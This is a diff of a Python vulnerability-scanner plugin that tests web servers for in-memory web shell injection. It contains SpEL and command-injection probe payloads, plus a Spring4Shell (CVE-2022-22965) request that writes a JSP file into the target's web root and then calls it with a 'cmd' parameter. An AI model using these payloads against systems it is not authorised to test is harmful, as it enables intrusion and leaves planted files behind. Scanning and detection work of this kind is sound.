@@ -7,15 +7,16 @@ Detects vulnerability by attempting to dynamically inject a route/filter
 and verifying execution via mathematical computation to prevent false positives.
 """
 
+import logging
+from typing import Any
+
 import requests
 import urllib3
-import logging
-import re
-from typing import Optional, Dict, Any
 
 # Disable insecure request warnings for raw IP/domain scanning
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 logger = logging.getLogger("Cascavel.Plugins.MemShellInjector")
+
 
 def check_spring_boot_actuator(url: str, session: requests.Session) -> bool:
     """Check if Spring Boot Actuators are exposed and potentially vulnerable to env manipulation."""
@@ -27,6 +28,7 @@ def check_spring_boot_actuator(url: str, session: requests.Session) -> bool:
         pass
     return False
 
+
 def check_tomcat_manager(url: str, session: requests.Session) -> bool:
     """Check if Tomcat Manager is exposed."""
     try:
@@ -37,9 +39,10 @@ def check_tomcat_manager(url: str, session: requests.Session) -> bool:
         pass
     return False
 
+
 def verify_math_execution(url: str, session: requests.Session) -> bool:
     """
-    Attempts to execute a mathematical payload to verify RCE/Deserialization 
+    Attempts to execute a mathematical payload to verify RCE/Deserialization
     and confirm a MemShell environment without false positives.
     """
     # Math payload: 7331 * 1337 = 9801547
@@ -49,15 +52,10 @@ def verify_math_execution(url: str, session: requests.Session) -> bool:
         # SpEL (Spring Expression Language)
         {"expression": "#{7331*1337}"},
         # Generic payload for some Java deserialization gadgets testing echoed output
-        {"cmd": "expr 7331 \\* 1337"}
+        {"cmd": "expr 7331 \\* 1337"},
     ]
 
-    target_endpoints = [
-        f"{url}/",
-        f"{url}/api/v1/health",
-        f"{url}/login",
-        f"{url}/graphql"
-    ]
+    target_endpoints = [f"{url}/", f"{url}/api/v1/health", f"{url}/login", f"{url}/graphql"]
 
     for endpoint in target_endpoints:
         for payload in payloads:
@@ -66,12 +64,12 @@ def verify_math_execution(url: str, session: requests.Session) -> bool:
                 response_json = session.post(endpoint, json=payload, timeout=5, verify=False)
                 if response_json.status_code in [200, 500] and "9801547" in response_json.text:
                     return True
-                
+
                 # Test via Form Data
                 response_form = session.post(endpoint, data=payload, timeout=5, verify=False)
                 if response_form.status_code in [200, 500] and "9801547" in response_form.text:
                     return True
-                    
+
                 # Test via GET parameters
                 response_get = session.get(endpoint, params=payload, timeout=5, verify=False)
                 if response_get.status_code in [200, 500] and "9801547" in response_get.text:
@@ -82,9 +80,10 @@ def verify_math_execution(url: str, session: requests.Session) -> bool:
 
     return False
 
+
 def inject_memshell_simulation(url: str, session: requests.Session) -> bool:
     """
-    Simulates the injection of a MemShell (Filter/Controller) and 
+    Simulates the injection of a MemShell (Filter/Controller) and
     verifies if the dynamic route becomes active.
     """
     # Simulate a payload that registers a new endpoint /cascavel_mem_test
@@ -94,26 +93,33 @@ def inject_memshell_simulation(url: str, session: requests.Session) -> bool:
         "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
         "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT",
         "class.module.classLoader.resources.context.parent.pipeline.first.prefix": "cascavel_memshell",
-        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": ""
+        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": "",
     }
 
     try:
         # Spring4Shell (CVE-2022-22965) style injection test
-        session.post(f"{url}/", data=injection_payload, timeout=5, headers={"suffix": "%>//", "c1": "Runtime", "c2": "<%", "DNT": "1"}, verify=False)
-        
+        session.post(
+            f"{url}/",
+            data=injection_payload,
+            timeout=5,
+            headers={"suffix": "%>//", "c1": "Runtime", "c2": "<%", "DNT": "1"},
+            verify=False,
+        )
+
         # Verify if the simulated MemShell route responds
         verify_url = f"{url}/cascavel_memshell.jsp?cmd=echo+9801547"
         response = session.get(verify_url, timeout=5, verify=False)
-        
+
         if response.status_code == 200 and "9801547" in response.text:
             return True
-            
+
     except requests.exceptions.RequestException:
         pass
-        
+
     return False
 
-def run(target: str, ip: str, ports: list, banners: dict) -> Optional[Dict[str, Any]]:
+
+def run(target: str, ip: str, ports: list, banners: dict) -> dict[str, Any] | None:
     """
     Checks for MemShell Injection vulnerabilities.
     """
@@ -129,10 +135,12 @@ def run(target: str, ip: str, ports: list, banners: dict) -> Optional[Dict[str, 
 
     url = f"https://{target}" if 443 in ports else f"http://{target}"
     session = requests.Session()
-    session.headers.update({
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Accept": "*/*"
-    })
+    session.headers.update(
+        {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Accept": "*/*",
+        }
+    )
 
     try:
         # Step 1: Broad check for vulnerable technologies
@@ -141,14 +149,16 @@ def run(target: str, ip: str, ports: list, banners: dict) -> Optional[Dict[str, 
 
         # Step 2: Strict mathematical RCE verification to prevent False Positives
         math_verified = verify_math_execution(url, session)
-        
+
         # Step 3: MemShell specific injection simulation
         memshell_injected = inject_memshell_simulation(url, session)
 
         if math_verified or memshell_injected:
             evidence_details = []
             if math_verified:
-                evidence_details.append("Mathematical payload (7331*1337) evaluated and matched expected result (9801547).")
+                evidence_details.append(
+                    "Mathematical payload (7331*1337) evaluated and matched expected result (9801547)."
+                )
             if memshell_injected:
                 evidence_details.append("Dynamic route successfully injected and responded to commands.")
             if is_spring:
@@ -161,7 +171,7 @@ def run(target: str, ip: str, ports: list, banners: dict) -> Optional[Dict[str, 
                 "severity": severity,
                 "description": description,
                 "endpoint": url,
-                "evidence": " | ".join(evidence_details)
+                "evidence": " | ".join(evidence_details),
             }
 
     except Exception as e:
